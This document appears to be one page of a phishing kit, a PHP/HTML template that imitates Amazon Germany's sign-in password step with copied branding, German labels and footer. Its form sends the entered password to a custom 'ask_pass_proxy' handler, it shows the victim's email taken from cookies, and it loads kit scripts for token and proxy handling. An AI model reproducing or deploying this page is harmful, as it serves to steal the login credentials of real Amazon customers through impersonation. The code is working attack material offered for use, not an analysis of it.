<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="pass/";
?>
<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-hires a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember">

<head>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
    <base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
    <link rel="stylesheet" href="form/css.css">
    <meta charset="UTF-8">
    <title dir="ltr">Amazon Anmelden</title>
    <link rel="stylesheet" href="61eRrGh+pIL._RC_11Fd9tJOdtL.css,21y5jWQoUML.css,31Q3id-QR0L.css,31P8A7PnBZL.css_.css#not-trident">
    <link rel="stylesheet" href="01SdjaY0ZsL._RC_419sIPk+mYL.css,41DvNOWXxOL.css_.css">
    <link rel="stylesheet" href="11E08O3eXDL.css">
    <link rel="shortcut icon" href="favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body class="ap-locale-de_DE a-m-de a-aui_157141-c a-aui_158613-c a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c a-meter-animate"     ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}"  ng-cloak    >
    <div id="a-page">
        <div class="a-section a-padding-medium auth-workflow">
            <div class="a-section a-spacing-none auth-navbar">
                <div class="a-section a-spacing-medium a-text-center"> <a class="a-link-nav-icon" tabindex="-1"> <i class="a-icon a-icon-logo" role="img"></i> <i class="a-icon a-icon-domain-de a-icon-domain" role="img"></i> </a> </div>
            </div>
            <div class="scum_container loader_show">
                <div class="scum" id="pass-view">
                    <div id="authportal-center-section" class="a-section">
                        <div id="authportal-main-section" class="a-section">
                            <div class="a-section a-spacing-base auth-pagelet-container"> </div>
                            <div class="a-section auth-pagelet-container">
                                <div class="a-section a-spacing-base">
                                    <div class="a-box">
                                        <div class="a-box-inner a-padding-extra-large">
                                            <h1 class="a-spacing-small"> Anmelden </h1>
                                            <div class="a-row a-spacing-base"> <span>{{cookies.email}}</span> <a href="../login" class="a-link-normal" tabindex="6"> Ändern </a> </div>
                                            
                                                <form name="signIn" novalidate="" onsubmit="send1(event,'ask_pass_proxy');return false" class="auth-validate-form auth-real-time-validation a-spacing-none">
                                                    <div class="a-section">
                                                        <div class="a-section a-spacing-large form-group">
                                                            <div class="a-row">
                                                                <div class="a-column a-span5">
                                                                    <label for="pass" class="a-form-label"> Passwort </label>
                                                                </div>
                                                                <div class="a-column a-span7 a-text-right a-span-last"> <a id="auth-fpp-link-bottom" class="a-link-normal" tabindex="3"> Passwort vergessen </a> </div>
                                                            </div>
                                                            <input type="password" id="pass" name="pass" tabindex="2" class="a-input-text a-span12 auth-autofocus auth-required-field  form-control" pattern=".{4,}" data-err_text="Please enter valid ">
                                                            


                                                            <div  class="err_span   a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert" style="display: none;">
                                                                <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>
                                                                    <div class="a-alert-content"> Geben Sie Ihr Passwort ein. </div>
                                                                </div>
                                                            </div>


                                                        </div>
                                                        <div class="a-section">
                                                            <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner">
                                                                    <input id="signInSubmit" tabindex="5" class="a-button-input" type="submit">
                                                                    <span id="auth-signin-button-announce" class="a-button-text"> Anmelden </span></span></span>
                                                            <div class="a-row a-spacing-top-medium">
                                                                <div class="a-section a-text-left"> <label for="auth-remember-me" class="a-form-label">
                                                                        <div class="a-checkbox"><label><input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label"> Angemeldet bleiben. <span class="a-declarative"> <a id="remember_me_learn_more_link" class="a-popover-trigger a-declarative"> Details <i class="a-icon a-icon-popover"></i></a> </span> </span></label></div>
                                                                    </label> </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </form>
                                            
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="right-2"> </div>
            <div class="a-section a-spacing-top-extra-large auth-footer">
                <div class="a-divider a-divider-section">
                    <div class="a-divider-inner"></div>
                </div>
                <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span> <a class="a-link-normal" target="_blank" rel="noopener"> Unsere AGB </a> <span class="auth-footer-seperator"></span> <a class="a-link-normal" target="_blank" rel="noopener"> Datenschutzerklärung </a> <span class="auth-footer-seperator"></span> <a class="a-link-normal" target="_blank" rel="noopener"> Hilfe </a> <span class="auth-footer-seperator"></span> <a class="a-link-normal" target="_blank" rel="noopener"> Impressum </a> <span class="auth-footer-seperator"></span> <a class="a-link-normal" target="_blank" rel="noopener"> Hinweise zu Cookies </a> <span class="auth-footer-seperator"></span> <a class="a-link-normal" target="_blank" rel="noopener"> Hinweise zu interessenbasierter Werbung </a> <span class="auth-footer-seperator"></span> </div>
                <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> © 1998-2020, Amazon.com, Inc. oder Tochtergesellschaften </span> </div>
            </div>
        </div>
        <div id="auth-external-javascript" class="auth-external-javascript"> </div>
    </div>
    <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
</body>

</html>